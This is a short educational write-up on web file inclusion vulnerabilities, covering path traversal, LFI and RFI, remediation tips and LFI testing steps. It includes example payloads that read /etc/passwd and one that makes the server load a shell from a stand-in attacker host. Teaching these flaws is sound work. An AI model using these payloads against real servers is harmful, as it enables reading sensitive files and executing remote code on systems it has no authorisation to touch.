# File Inclusion
### What is File Inclusion?
**File Inclusion** is a **web application vulnerability** that occurs when an application allows user-supplied input to control which file is loaded on the **server** without proper validation.
### Why do File Inclusion vulnerabilities happen?
This **vulnerability** happens when user input is not sanitized or validated.
### What is the risk of File Inclusion?
An attacker can exploit this **vulnerability** to leak data such as **source code**, **credentials** and **admin-related** information.
## Path Traversal
### What is Path Traversal?
**Path Traversal** is a **web security vulnerability** that allows an attacker to read the local files stored on the server. The attacker can **exploit** this **vulnerability** by manipulating the **web application's URL** to locate and access the files stored outside the **web application's** root directory.
**Example**: `?page=../../../../etc/passwd`
### Why does Path Traversal happen?
**Path Traversal vulnerability** occurs when user input is passed through a **PHP** function such as `file_get_contents`. The function itself is not the main cause of this **vulnerability**; poor input validation is the real cause.
### What is the risk of Path Traversal?
An attacker can read the local files stored on the **web server**.
## LFI
### What is Local File Inclusion?
**Local File Inclusion** (**LFI**) is a **web application vulnerability** that occurs when an application insecurely includes files on the server using user-supplied input. Attackers **exploit** this to read, execute, or include sensitive files by manipulating file paths.
**Example**: `?page=/etc/passwd`
### How it works?
It occurs when applications use unvalidated input to construct paths for functions like `include`, `require`, or `include_once` in PHP.
## RFI
### What is Remote File Inclusion?
**Remote File Inclusion** (**RFI**) is a high-impact **web application vulnerability** that allows an attacker to force a **web application** to include and execute malicious files hosted on a remote server.
**Example**: `?page=http://attacker.com/shell.txt`
### How it works?
It occurs when an application improperly sanitizes user-supplied input that is passed into `include` or `require` functions, allowing external **URLs** to be injected.
## Remediation
To prevent the **file inclusion vulnerabilities**, some common suggestions include:
- Keep **OS**, **web server**, and **frameworks** updated.
- Disable verbose error messages.
- Use a **WAF** to mitigate attacks.
- Validate all user input for file parameters.
## Steps for testing for LFI
- Identify potential entry points (`GET`, `POST`, `cookies`, and headers).
- Test with valid and invalid inputs.
- Observe errors or abnormal responses.
- Use tools like **Burp Suite** for request manipulation.
- Analyze filters and attempt to read sensitive files.


